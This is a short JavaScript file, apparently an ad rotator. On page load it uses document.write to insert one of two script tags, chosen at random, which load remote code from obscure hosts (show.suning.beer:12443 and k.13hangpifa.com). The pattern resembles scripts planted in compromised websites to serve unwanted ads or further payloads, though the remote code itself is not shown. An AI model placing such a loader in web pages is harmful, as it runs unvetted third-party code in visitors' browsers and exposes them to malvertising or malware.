var randoms = {
	ads_codes: ['<script src="https://show.suning.beer:12443/ty/4FE5DC55-36F5-1889-33-B98EFFACB042.alpha"><'+'/script>','<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'https://k.13hangpifa.com/d.php?pid=3860\'><'+'/script>'],
	ads_weight: [10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();